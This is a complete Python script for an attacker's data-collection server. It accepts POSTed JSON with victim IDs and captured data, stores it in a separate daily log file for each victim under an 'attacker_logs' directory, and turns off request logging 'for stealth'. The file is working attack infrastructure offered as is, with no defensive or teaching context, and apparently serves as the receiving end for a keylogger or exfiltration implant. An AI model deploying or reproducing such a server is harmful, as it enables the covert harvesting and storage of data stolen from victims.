#!/usr/bin/env python3
import os
import json
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

LOG_ROOT = os.path.join(os.getcwd(), "attacker_logs")

class LogHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != "/logs":
            self.send_response(404)
            self.end_headers()
            return
        length = int(self.headers.get('Content-Length', '0'))
        body = self.rfile.read(length)
        try:
            payload = json.loads(body.decode('utf-8'))
            victim_id = payload.get('victim_id')
            timestamp = payload.get('timestamp')
            data = payload.get('data')
            if not victim_id or data is None:
                raise ValueError("Missing victim_id or data")
            # Prepare directories
            os.makedirs(LOG_ROOT, exist_ok=True)
            victim_dir = os.path.join(LOG_ROOT, victim_id)
            os.makedirs(victim_dir, exist_ok=True)
            # Daily file
            day = datetime.datetime.now().strftime('%Y-%m-%d')
            log_path = os.path.join(victim_dir, f"{day}.log")
            # Append JSON line
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps({
                    'timestamp': timestamp,
                    'data': data
                }, ensure_ascii=False) + "\n")
            # Respond OK
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        except Exception as e:
            self.send_response(400)
            self.end_headers()
            msg = {"error": str(e)}
            self.wfile.write(json.dumps(msg).encode('utf-8'))

    def log_message(self, format, *args):
        # Silence default HTTP server logs for stealth
        return


def run(host="0.0.0.0", port=5000):
    os.makedirs(LOG_ROOT, exist_ok=True)
    httpd = HTTPServer((host, port), LogHandler)
    print(f"[AttackerServer] Listening on {host}:{port}, logs -> {LOG_ROOT}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[AttackerServer] Stopped")

if __name__ == "__main__":
    run()
